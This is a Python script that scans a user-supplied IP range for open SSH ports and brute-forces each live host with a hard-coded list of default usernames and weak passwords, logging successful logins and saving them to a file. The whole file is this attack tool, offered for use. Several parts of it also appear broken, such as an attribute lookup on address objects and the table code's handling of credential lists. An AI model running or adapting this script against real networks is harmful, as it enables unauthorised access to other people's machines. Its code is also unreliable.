import asyncio 
import socket 
import time 
import paramiko 
import logging 
import ipaddress 
from rich.console import Console 
from rich.table import Table 
from rich.logging import RichHandler  

console = Console()
console.print("Let's scan for SSH credentials...", style="bold blue")  

logging.basicConfig(     
    level="NOTSET", 
    format="%(message)s", 
    handlers=[RichHandler(console=console, markup=True)] 
)  

log = logging.getLogger("scancodes")  

async def check_port(ip_address, port):
    """
    Checks whether or not a port is open for a specified IP address
    """
    try:
        await asyncio.wait_for(asyncio.open_connection(ip_address.ip, port), timeout=0.5)
        return ip_address
    except:
        return None  

async def scan_ips(ip_range, port):
    """
    Scans a range of IP addresses for an open port
    """
    loop = asyncio.get_event_loop() 
    tasks = [loop.create_task(check_port(i, port)) for i in ip_range]  
    results = await asyncio.gather(*tasks, return_exceptions=True) 
    live_ips = [ip for ip in results if ip is not None] 

    console.print(f"Scanned {len(ip_range)} IP addresses and found {len(live_ips)} live IPs", style="cyan") 
    log.info(f"Live IPs found: {live_ips}") 

    return live_ips  

async def try_ssh(ip_address, username, password):
    """
    Attempts an SSH connection with a specified username and password for a given IP address
    """
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(ip_address, username=username, password=password, timeout=0.5, banner_timeout=5)
        return username, password
    except:
        return None, None  

async def scan_ssh(ip_address):
    """
    Scans an IP address with a range of default usernames and passwords
    to return successful SSH login credentials
    """
    loop = asyncio.get_event_loop() 
    usernames = ['root', 'admin', 'ubuntu','kali']
    passwords = ['password', '123456', 'admin', 'toor', 'qwerty'] 
    tasks = [loop.create_task(try_ssh(ip_address, user, password)) for user in usernames for password in passwords]  
    results = await asyncio.gather(*tasks, return_exceptions=True) 
    credentials = [(user, password) for user, password in results if user is not None] 

    console.print(f"Scanned {ip_address} with {len(usernames) * len(passwords)} pairs and found {len(credentials)} successful logins", style="cyan") 
    log.info(f"Credentials found for {ip_address}: {credentials}") 
    return credentials  

def print_results_table(credentials):
    """
    Prints a table to the console with successful SSH login credentials
    """
    table = Table(title="SSH Credentials")
    table.add_column("IP Address", justify="center", style="cyan", no_wrap=True)
    table.add_column("Username", justify="center", style="purple")
    table.add_column("Password", justify="center", style="green")

    for ip, credential in credentials.items():
        table.add_row(f"[bold]{ip}[/bold]", credential[0], credential[1])
        log.info(f"{ip}: Username={credential[0]}, Password={credential[1]}")

    console.print(table)

def write_to_file(credentials):
    """
    Writes successful SSH login credentials to a file
    """
    with open("successful_logins.txt", "a") as f:
        for ip, credential in credentials.items():
            f.write(f"{ip}\t{credential[0]}\t{credential[1]}\n") 

async def main():
    """
    Main function to be run
    """
    while True:
        ip_range = input("Please enter the IP range to be scanned: ")
        try:
            parsed_ip_range = ipaddress.ip_network(ip_range)
            ip_list = list(parsed_ip_range.hosts())
            break
        except ipaddress.AddressValueError:
            print("Invalid IP range format. Please try again.")

    port = 22
    live_ips = await scan_ips(ip_list, port)

    if len(live_ips) == 0:
        console.print("No live IPs found in range. Exiting.", style="bold red")
        return

    credentials = {}
    for ip in live_ips:
        credentials[ip] = await scan_ssh(ip)

    print_results_table(credentials)
    write_to_file(credentials) 

if __name__ == '__main__':
    asyncio.run(main())
